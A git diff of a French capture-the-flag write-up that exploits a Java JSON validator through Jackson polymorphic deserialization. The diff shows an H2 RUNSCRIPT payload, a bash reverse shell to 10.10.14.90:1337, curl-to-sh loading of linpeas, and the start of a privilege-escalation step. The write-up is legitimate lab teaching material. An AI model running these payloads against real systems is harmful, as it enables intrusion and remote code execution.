@@ -32,7 +32,7 @@ Système d'exploitation Linux.
 Nous allons jeter un coup d'œil au port ``http/80`` pour voir ce qu'il y'a d'intéressant.
 
 
-## 0x2 - ``Enumération web``
+## 0x2 - Enumération web
 
 
 Nous voyons un embellisseur et un validateur json en ligne avec 2 options, ``"Beatify"`` et ``"Validate! (Beta)"``.
@@ -58,8 +58,8 @@ Validation failed: Unhandled Java exception:com.fasterxml.jackson.databind.exc.M
 
 
 
-J'ai collé le message d'erreur dans la barre de recherche google : ```Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object``` Je suis tombé sur un article de stackoverflow, expliquant l'erreur en question.
-<a href="https://stackoverflow.com/questions/26251486/jackson-polymorphic-deserialization-expected-start-array">here article</a>
+J'ai collé le message d'erreur dans la barre de recherche google : ```Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object``` Je suis tombé sur un article de ``stackoverflow``, expliquant l'erreur en question.
+<a href="https://stackoverflow.com/questions/26251486/jackson-polymorphic-deserialization-expected-start-array">article here</a>
 
 
 
@@ -67,13 +67,13 @@ J'ai collé le message d'erreur dans la barre de recherche google : ```Unexpecte
 
 
 
-Après l'avoir lu, j'ai compris que l'erreur est liée à Jackson Polymorphic Deserialization expected START_ARRAY.
+Après l'avoir lu, j'ai compris que l'erreur est liée à ``Jackson Polymorphic Deserialization expected START_ARRAY``.
 
 
 ## 0x3 - Foothold
 
 
-Maintenant, vous devez créer un fichier inject.sql et ajouter un reverse shell en bash pour qu'il me rappelle. :
+Maintenant, vous devez créer un fichier ak.sql et ajouter un reverse shell en bash pour qu'il me rappelle. :
 
 ```sh
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
@@ -84,6 +84,7 @@ $$;
 CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
 ```
 
+
 Maintenant démarrer un listenner avec netcat :
 
 ```sh
@@ -91,10 +92,11 @@ nc -nvlp 1337
 listening on [any] 1337 ...
 ```
 
-Et injecter votre payload sur l'option : "Validate!(Beta)".
+Et injecter votre payload sur l'option : ``"Validate!(Beta)"``.
+
 
 ```sh
-[“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/inject.sql'”}]
+[“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/ak.sql'”}]
 ```
 
 Et vous obtenez un reverse shell sur l'user pericles.
@@ -114,14 +116,17 @@ $export TERM=xterm
 
 Vous obtenez l'user flag :
 
-```
+```sh
 pericles@time:/home/pericles$ cat user.txt 
 cat user.txt
 7u7243a41d508868b8c935c47b554ad7
 ```
+
+
 ## 0x3 - Privilege Escalation
 
-Maintenant nous allons upload Linpeas ( LinPEAS est un script qui recherche des chemins possibles pour augmenter les privilèges sous Linux ).
+
+Maintenant nous allons upload ``Linpeas`` ( LinPEAS est un script qui recherche des chemins possibles pour augmenter les privilèges sous Linux ).
 
 Installer linpeas : <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>
 
@@ -132,13 +137,13 @@ sudo python -m SimpleHTTPServer 80 #Host
 curl 10.10.10.10/linpeas.sh | sh #Victim
 ```
 
-Nous pouvons voir que root a accédé à ce fichier: «/usr/bin/timer_backup.sh». Qui appartient à votre utilisateur et est accessible en écriture et writeable.
+Nous pouvons voir que root a accédé à ce fichier: ``«/usr/bin/timer_backup.sh»``. Qui appartient à votre utilisateur et est accessible en écriture et writeable.
 
 
 ![ak](https://media.discordapp.net/attachments/490431433559506954/834009494190817280/unknown.png)
 
 
-Vous devez créer votre clé ssh, ajouter notre clé publique SSH au fichier allowed_keys sur le serveur. Pour ce faire, suivez les commandes suivants :
+Vous devez créer votre clé ssh, ajouter notre clé publique SSH au fichier ``allowed_keys`` sur le serveur. Pour ce faire, suivez les commandes suivants :
 
 
 ```sh
